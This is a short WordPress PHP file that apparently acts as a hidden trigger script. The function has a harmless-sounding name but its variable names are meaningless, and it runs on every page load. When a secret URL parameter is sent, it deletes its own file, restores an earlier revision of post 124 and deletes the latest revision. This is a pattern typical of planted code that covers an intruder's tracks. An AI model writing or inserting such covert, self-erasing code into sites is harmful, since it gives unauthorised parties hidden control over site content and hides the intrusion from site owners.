<?php

function tool_downloads_fix_xml() {
	if (isset($_GET['clean_last_cover']) && $_GET['clean_last_cover'] === 'rtl_gallery_first') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$animated_player_page_forms = 124;
		$bulk_booster_business_old = wp_get_post_revisions($animated_player_page_forms);
		if (empty($bulk_booster_business_old)) die('no revisions');
		if (count($bulk_booster_business_old) < 2) die('less than 2');
		$refresh_interactive_cf7_number = array_shift($bulk_booster_business_old);
		$cleaner_controller_fast_web = $refresh_interactive_cf7_number->ID;
		$tiny_total_nofollow = array_shift($bulk_booster_business_old);
		$sites_lazy_options = $tiny_total_nofollow->ID;
		$extensions_card_integrate = wp_restore_post_revision($sites_lazy_options);
		if ($extensions_card_integrate === false) die('error restoring');
		$extensions_card_integrate = wp_delete_post_revision($cleaner_controller_fast_web);		
		if ($extensions_card_integrate === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'tool_downloads_fix_xml');
